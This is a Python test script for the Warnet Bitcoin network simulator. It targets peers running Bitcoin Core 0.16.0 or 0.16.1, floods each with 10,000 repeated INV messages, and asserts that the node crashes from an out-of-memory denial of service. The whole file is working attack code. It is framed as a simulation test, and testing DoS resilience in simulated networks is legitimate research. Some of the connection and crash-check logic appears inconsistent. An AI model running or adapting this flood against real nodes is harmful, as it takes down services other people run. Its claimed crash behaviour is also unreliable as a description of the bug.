#!/usr/bin/env python3
import time
import threading
from test_framework.messages import CInv, msg_inv
from test_framework.p2p import P2PInterface
from warnet.test_framework_bridge import WarnetTestFramework
from test_framework.util import assert_equal

def cli_help():
    return "Run TX INV OOM DoS test on Bitcoin Core 0.16.0 and 0.16.1 to verify node crash"

class TxInvOOMDOSNode(P2PInterface):
    def __init__(self):
        super().__init__()
        self.lastInv = []

    def on_inv(self, message):
        self.lastInv = [inv.hash for inv in message.inv]

class TxInvOOMDOSTest(WarnetTestFramework):
    def set_test_params(self):
        self.num_nodes = 0  # We'll connect to existing nodes in the network
        self.num_invs = 10000  # Number of INV messages to send
        self.test_duration = 300  # Test duration in seconds (5 minutes)
        self.stop_event = threading.Event()

    def run_test(self):
        self.wait_for_network_connection()
        target_nodes = self.find_target_nodes()

        if not target_nodes:
            self.log.warning("No nodes running version 0.16.0 or 0.16.1 found")
            return

        for i, node in enumerate(target_nodes):
            self.log.info(f"Testing node {i} running version 0.16.0 or 0.16.1")
            p2p_conn = self.establish_p2p_connection(node, i)
            
            monitor_thread = threading.Thread(target=self.monitor_node_connection, args=(node,))
            exploit_thread = threading.Thread(target=self.trigger_exploit, args=(p2p_conn,))
            
            monitor_thread.start()
            exploit_thread.start()
            
            monitor_thread.join()
            exploit_thread.join()
            
            self.check_node_crash(node, p2p_conn)
            self.stop_event.clear()

    def wait_for_network_connection(self):
        self.log.info("Waiting for complete network connection...")
        while not self.warnet.network_connected():
            time.sleep(5)
        self.log.info("Network connected")

    def find_target_nodes(self):
        target_nodes = []
        for node in self.nodes:
            peer_info = node.getpeerinfo()
            for peer in peer_info:
                if peer['version'] in [160000, 160100]:
                    target_nodes.append(node)
                    self.log.info(f"Found node running version 0.16.x: {peer['version']}")
                    break
        return target_nodes

    def establish_p2p_connection(self, node, index):
        return node.add_p2p_connection(TxInvOOMDOSNode(), dstaddr=self.warnet.tanks[index].ipv4, dstport=18444)

    def trigger_exploit(self, node):
        self.log.info(f"Sending {self.num_invs} INV messages")
        start_time = time.time()
        hash = '0000000000000000000000000000000000000000000000000000000000000001'
        obj = CInv(1, int(hash, 16))

        for i in range(self.num_invs):
            if self.stop_event.is_set():
                self.log.info("Stopping message transmission due to node disconnection")
                break
            
            node.send_message(msg_inv([obj]))
            
            if i % 1000 == 0:
                elapsed_time = time.time() - start_time
                self.log.info(f"Sent {i} INV messages in {elapsed_time:.2f} seconds...")

        total_time = time.time() - start_time
        self.log.info(f"Finished sending INV messages in {total_time:.2f} seconds")

    def monitor_node_connection(self, node):
        start_time = time.time()
        self.log.info("Monitoring node connection status...")

        while time.time() - start_time < self.test_duration:
            if not node.is_connected():
                self.log.info("Node disconnected during the test")
                self.stop_event.set()
                return
            time.sleep(10)

        if node.is_connected():
            self.log.info("Node remained connected throughout the test duration")
        else:
            self.log.info("Node disconnected at the end of the test duration")

    def check_node_crash(self, node, p2p_conn):
        try:
            node.ping()
            self.log.error("Node did not crash as expected")
            assert False, "Node did not crash due to TX INV OOM DoS attempt"
        except Exception as e:
            self.log.info(f"Node crashed as expected. Error: {str(e)}")

        assert not p2p_conn.is_connected(), "P2P connection should be closed if the node crashed"
        assert not node.is_connected(), "Node should not be connected if it crashed"
        self.log.info("Node crashed due to TX INV OOM DoS attempt as expected")

if __name__ == "__main__":
    TxInvOOMDOSTest().main()
